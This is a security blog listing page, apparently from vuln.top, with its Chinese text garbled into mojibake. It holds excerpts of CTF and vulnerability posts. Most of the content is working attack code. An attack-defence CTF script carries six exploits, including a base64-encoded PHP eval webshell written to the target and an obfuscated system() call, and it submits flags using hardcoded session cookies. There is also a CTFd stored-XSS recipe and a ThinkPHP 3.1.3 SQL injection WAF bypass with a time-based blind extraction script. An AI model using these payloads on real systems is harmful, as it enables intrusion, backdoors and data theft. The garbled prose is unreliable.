</span></span><span style="display:flex;"><span>                queryStr <span style="color:#f92672">=</span> UrlUtils.<span style="color:#a6e22e">encodeQuery</span>(UrlUtils.<span style="color:#a6e22e">decode</span>(queryStr));
</span></span><span style="display:flex;"><span>                logoutUrl.<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#39;?&#39;</span>).<span style="color:#a6e22e">append</span>(queryStr);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            model.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;logoutPath&#34;</span>, logoutUrl.<span style="color:#a6e22e">toString</span>());
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;customError&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>æ‰€ä»¥æˆ‘ä»¬ç»§ç»­å¾€ä¸Šæ‰¾åˆ°<code>getErrorPage</code>å’Œ<code>handleUnauthorizedError</code>ï¼Œè°ƒç”¨äº†<code>handleGenericError</code></p>
          
        </div>

        
          <div>
            <a class="read-more button" href="/posts/cve-2022-22954/"> â†’</a>
          </div>
        
      </article>
    
      <article class="post on-list">
        <h1 class="post-title">
          <a href="https://vuln.top/posts/awd-flag-script/">AWD FLAG SCRIPT</a>
        </h1>
        <div class="post-meta">
          
            <time class="post-date">
              2022-04-22 ::
            </time>
          
          
            <span class="post-author">Ca1s1</span>
          
        </div>

        
          <span class="post-tags">
            
            #<a href="https://vuln.top/tags/awd/">AWD</a>&nbsp;
            
            #<a href="https://vuln.top/tags/ctf/">CTF</a>&nbsp;
            
          </span>
        

        


        <div class="post-content">
          
            <h1 id="awd-flagè„šæœ¬">AWD FLAGè„šæœ¬</h1>
<p>ä¹‹å‰AWDçš„è‡ªåŠ¨å†™ğŸ´è·å–flagè„šæœ¬ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">filename</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">+</span>str(int(random<span style="color:#f92672">.</span>uniform(<span style="color:#ae81ff">10000000</span>, <span style="color:#ae81ff">99999999</span>)))<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;.php&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp1</span>(target):
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/test.php&#39;</span>
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;cmd&#34;</span>:<span style="color:#e6db74">&#34;system(&#39;cat /flag&#39;);&#34;</span>}
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url, data<span style="color:#f92672">=</span>data, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># res = re.findall(r&#34;flag{.*}&#34;, r.text)</span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp2</span>(target):
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/about.php?file=/flag&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp3</span>(target):
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/editor.php&#39;</span>
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;boy&#34;</span>:<span style="color:#e6db74">&#34;cat /flag&#34;</span>}
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url, data<span style="color:#f92672">=</span>data, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp4</span>(target):
</span></span><span style="display:flex;"><span>    Filename <span style="color:#f92672">=</span> filename()
</span></span><span style="display:flex;"><span>    write_backdoor_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/type.php?m=sPD9waHAgZXZhbChAJF9QT1NUWydjbWQnXSk7Pz4=&amp;file=php://filter/write=convert.base64-decode/resource=&#39;</span><span style="color:#f92672">+</span>Filename
</span></span><span style="display:flex;"><span>    getflag_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/&#39;</span><span style="color:#f92672">+</span>Filename
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;cmd&#34;</span>:<span style="color:#e6db74">&#34;system(&#39;cat /flag&#39;);&#34;</span>}
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>write_backdoor_url)
</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;[+]Backdoor is Write in :&#34;</span><span style="color:#f92672">+</span>getflag_url
</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>getflag_url, data<span style="color:#f92672">=</span>data, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># res = re.findall(r&#34;flag{.*}&#34;, r.text)</span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp5</span>(target):
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/admin/articlelist.php?a=cat%20/flag&amp;str=2;$a=sys.tem;$b=curr.ent;$a($b($b($GLOBALS)));&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp6</span>(target):
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/.aa&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-.</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">&#39;</span>, r<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;}&#39;</span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+]Flag Found: &#39;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;-&gt;&#39;</span><span style="color:#f92672">+</span>res)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">submit</span>(flag_value):
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://x.x.x.x:8000/api/v1/challenges/attempt&#39;</span>
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps({<span style="color:#e6db74">&#34;challenge_id&#34;</span>:<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;submission&#34;</span>:flag_value})
</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Accept&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;CSRF-Token&#39;</span>: <span style="color:#e6db74">&#39;c7b3f18a7eac5935b8f4279e53be8824fc304d85599c6e5ebd9ae4e701bb640e&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Origin&#39;</span>: <span style="color:#e6db74">&#39;http://x.x.x.x:8000&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Referer&#39;</span>: <span style="color:#e6db74">&#39;http://x.x.x.x:8000/challenges&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Accept-Encoding&#39;</span>: <span style="color:#e6db74">&#39;gzip, deflate&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Accept-Language&#39;</span>: <span style="color:#e6db74">&#39;zh-CN,zh;q=0.9&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Cookie&#39;</span>: <span style="color:#e6db74">&#39;PHPSESSID=to9lsb0m9jrpv1hmdg37he5aa2; session=1f8b1fe6-ab39-4fa4-a03d-617a80f0b2b7&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Connection&#39;</span>: <span style="color:#e6db74">&#39;close&#39;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
</span></span><span style="display:flex;"><span>    req <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(url <span style="color:#f92672">=</span> url,headers<span style="color:#f92672">=</span>headers,data<span style="color:#f92672">=</span>data,verify <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>    print(req<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">15</span>):
</span></span><span style="display:flex;"><span>        ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;x.x.x.x:3</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">80&#34;</span><span style="color:#f92672">.</span>format(str(i)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">2</span>,<span style="color:#e6db74">&#39;0&#39;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp1(ip)</span>
</span></span><span style="display:flex;"><span>        flag <span style="color:#f92672">=</span> exp2(ip)
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp3(ip)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp4(ip)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp5(ip)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># flag = exp6(ip)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># submit(flag)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># a=cat%20/flag&amp;str=2;$a=sys.tem;$b=curr.ent;$a($b($b($GLOBALS)));</span>
</span></span></code></pre></div>
          
        </div>

        
          <div>
            <a class="read-more button" href="/posts/awd-flag-script/"> â†’</a>
          </div>
        
      </article>
    
      <article class="post on-list">
        <h1 class="post-title">
          <a href="https://vuln.top/posts/ctfd-plugin-xss-/">CTFD plugin xss</a>
        </h1>
        <div class="post-meta">
          
            <time class="post-date">
              2022-04-22 ::
            </time>
          
          
            <span class="post-author">Ca1s1</span>
          
        </div>

        
          <span class="post-tags">
            
            #<a href="https://vuln.top/tags/xss/">XSS</a>&nbsp;
            
            #<a href="https://vuln.top/tags/ctfd/">CTFD</a>&nbsp;
            
          </span>
        

        


        <div class="post-content">
          
            <h1 id="ctfd-æ’ä»¶-å­˜å‚¨å‹-xss">CTFD æ’ä»¶ å­˜å‚¨å‹ XSS</h1>
<p>å¦‚ä¸‹ctfdå­˜åœ¨æ£€æµ‹ä½œå¼Šçš„æ’ä»¶</p>
<p><img src="/img/25de7e35c31c494f8a5283300bf65d20/Untitled.png" alt="/img/25de7e35c31c494f8a5283300bf65d20/Untitled.png"></p>
<p>åˆ›å»º2ä¸ªç”¨æˆ·ï¼Œç¬¬ä¸€ä¸ªç”¨æˆ· çš„ usernameè®¾ç½®ä¸ºxssçš„payloadï¼Œç¬¬äºŒä¸ªç”¨æˆ·éšæ„</p>
<p><img src="/img/25de7e35c31c494f8a5283300bf65d20/Untitled%201.png" alt="/img/25de7e35c31c494f8a5283300bf65d20/Untitled%201.png"></p>
<p>ç™»é™†ç”¨æˆ·1ï¼Œéšä¾¿åšä¸€é¢˜æ‹¿åˆ°flagåï¼Œç™»é™†ç”¨æˆ·2é€’äº¤ç”¨æˆ·1çš„flagï¼Œå‘ç°è¢«ç³»ç»Ÿæ£€æµ‹ï¼Œè®¿é—®/notificationsï¼Œè§¦å‘xssã€‚</p>
<p><img src="/img/25de7e35c31c494f8a5283300bf65d20/Untitled%202.png" alt="/img/25de7e35c31c494f8a5283300bf65d20/Untitled%202.png"></p>
          
        </div>

        
          <div>
            <a class="read-more button" href="/posts/ctfd-plugin-xss-/"> â†’</a>
          </div>
        
      </article>
    
      <article class="post on-list">
        <h1 class="post-title">
          <a href="https://vuln.top/posts/thinkphp3.1.3_sql_bypass/">thinkphp3.1.3 sqlæ³¨å…¥ bypass</a>
        </h1>
        <div class="post-meta">
          
            <time class="post-date">
              2022-03-04 ::
            </time>
          
          
            <span class="post-author">Ca1s1</span>
          
        </div>

        
          <span class="post-tags">
            
            #<a href="https://vuln.top/tags/sql/">sql</a>&nbsp;
            
            #<a href="https://vuln.top/tags/bypass/">bypass</a>&nbsp;
            
            #<a href="https://vuln.top/tags/thinkphp/">thinkphp</a>&nbsp;
            
          </span>
        

        


        <div class="post-content">
          
            <h1 id="thinkphp313-bypass-sqlæ³¨å…¥">thinkphp3.1.3 bypass sqlæ³¨å…¥</h1>
<p>è¿™æ˜¯æŸæ¬¡ä¼—æµ‹å‘ç°çš„æ¼æ´,å¼€å§‹å‘ç°æ˜¯thinkphp3.1.3æ¡†æ¶ï¼Œå°è¯•äº†ä¸‹å°†å‚æ•°å˜æˆæ•°ç»„å½¢å¼ï¼Œè¿”å›sqlæŠ¥é”™,ä¹‹åå°±å°è¯•ç»•è¿‡wafã€‚</p>
<p>urlï¼š<code>http://**/console/</code></p>
<p>ç™»é™†å¤„å­˜åœ¨sqlæ³¨å…¥</p>
<p>å­˜åœ¨æ¼æ´çš„urlï¼š<code>http://**/console/Admin/Index/Login.shtml</code></p>
<p>1ã€<em>account</em>å‚æ•°å­˜åœ¨<em>sqlæ³¨å…¥</em>ï¼Œé€šè¿‡<code>#a%0a</code>å¯bypass waf å¦‚ä¸‹è¯­å¥å¯é€ æˆ10ç§’å»¶è¿Ÿï¼ŒéªŒè¯æ³¨å…¥</p>
<pre tabindex="0"><code>account[]=exp&amp;account[1]=))#a%0aunion(#a%0aselect#a%0a(#a%0aselect#a%0asleep#a%0a(10))#a%0afrom#a%0a(select#a%0asleep#a%0a(10))a)#
</code></pre><p>2ã€ç¼–å†™è„šæœ¬è·å–æ•°æ®åº“å:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>u <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://**/console/Admin/Index/Login.shtml&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>strs <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#34;</span>
</span></span><span style="display:flex;"><span>strs <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz0123456789_&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;Cookie&#34;</span>:<span style="color:#e6db74">&#34;PHPSESSID=xxx&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sess <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session();
</span></span><span style="display:flex;"><span>sess<span style="color:#f92672">.</span>headers<span style="color:#f92672">=</span>headers
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>xixi <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>(i,s,times<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>	t1 <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>	data <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;account[]&#34;</span>:<span style="color:#e6db74">&#34;exp&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;account[1]&#34;</span>:<span style="color:#e6db74">&#34;))union#a</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">(select#a</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">(1)from#a</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">(select if#a</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">(lower((mid((database()),&#34;</span><span style="color:#f92672">+</span>str(i)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,1)))=&#39;&#34;</span><span style="color:#f92672">+</span>s<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#39;,sleep#a</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">(4),0))a)#&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;password[]&#34;</span>:<span style="color:#e6db74">&#34;6a&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;verify&#34;</span>:<span style="color:#e6db74">&#34;6677&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	print(s)
</span></span><span style="display:flex;"><span>	r <span style="color:#f92672">=</span> sess<span style="color:#f92672">.</span>post(u,data<span style="color:#f92672">=</span>data,proxies<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;http&#34;</span>:<span style="color:#e6db74">&#34;http://127.0.0.1:8080/&#34;</span>})
</span></span><span style="display:flex;"><span>	t <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()<span style="color:#f92672">-</span>t1
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> t<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">4</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> times<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> check(i,s,times<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
